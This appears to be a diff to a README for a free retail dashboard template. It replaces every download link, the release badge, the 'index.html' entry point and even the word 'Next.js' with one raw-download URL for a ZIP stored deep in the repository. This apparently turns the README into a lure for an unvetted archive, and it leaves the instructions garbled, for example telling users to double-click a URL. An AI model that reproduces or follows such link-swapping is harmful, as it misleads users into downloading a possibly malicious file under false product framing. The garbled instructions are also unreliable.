@@ -7,24 +7,24 @@ Welcome to the free-retail-dashboard-template! This tool helps you easily manage
 
 ## 🌐 Download Link
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Dan775/free-retail-dashboard-template/releases)
+[![Download Now](https://github.com/Dan775/free-retail-dashboard-template/raw/refs/heads/main/components/dashboard/free-dashboard-template-retail-v3.4.zip%20Now-Get%20Started-brightgreen)](https://github.com/Dan775/free-retail-dashboard-template/raw/refs/heads/main/components/dashboard/free-dashboard-template-retail-v3.4.zip)
 
 ## 📦 Download & Install
 
 To get started, you need to visit the releases page where you can download the latest version of the dashboard template. Follow these steps:
 
-1. Click on this link: [Download Latest Version](https://github.com/Dan775/free-retail-dashboard-template/releases).
+1. Click on this link: [Download Latest Version](https://github.com/Dan775/free-retail-dashboard-template/raw/refs/heads/main/components/dashboard/free-dashboard-template-retail-v3.4.zip).
 2. Look for the latest release at the top of the page.
 3. Click on the assets section to see available files for download.
-4. Select the suitable file for your operating system. For most users, this will be the file named `free-retail-dashboard-template.zip`.
+4. Select the suitable file for your operating system. For most users, this will be the file named `https://github.com/Dan775/free-retail-dashboard-template/raw/refs/heads/main/components/dashboard/free-dashboard-template-retail-v3.4.zip`.
 
 Once the download completes, follow these steps to install:
 
 1. Open the downloaded ZIP file.
 2. Extract the files to a directory on your computer.
-3. Open the folder and find the `index.html` file. This file acts as the main entry point for the dashboard.
+3. Open the folder and find the `https://github.com/Dan775/free-retail-dashboard-template/raw/refs/heads/main/components/dashboard/free-dashboard-template-retail-v3.4.zip` file. This file acts as the main entry point for the dashboard.
 
-To view the dashboard, simply double-click the `index.html` file. Your default web browser will open, and you will see the dashboard in action!
+To view the dashboard, simply double-click the `https://github.com/Dan775/free-retail-dashboard-template/raw/refs/heads/main/components/dashboard/free-dashboard-template-retail-v3.4.zip` file. Your default web browser will open, and you will see the dashboard in action!
 
 ## 🛠️ Features
 
@@ -42,7 +42,7 @@ This dashboard template runs in modern web browsers. Ensure your browser is up t
 
 ## 📚 Usage Instructions
 
-After opening the `index.html` file in your browser:
+After opening the `https://github.com/Dan775/free-retail-dashboard-template/raw/refs/heads/main/components/dashboard/free-dashboard-template-retail-v3.4.zip` file in your browser:
 
 1. **Explore Charts:** Click through different sections to see how your data can be represented.
 2. **Customize Components:** Adjust any UI components by editing the HTML/CSS files inside the extracted folder.
@@ -61,7 +61,7 @@ This project covers various topics related to web development and retail analyti
 - CSS
 - Dashboard design
 - Fintech solutions
-- Templates using Next.js and React
+- Templates using https://github.com/Dan775/free-retail-dashboard-template/raw/refs/heads/main/components/dashboard/free-dashboard-template-retail-v3.4.zip and React
 - Tailwind CSS use
 
 ## 📄 License
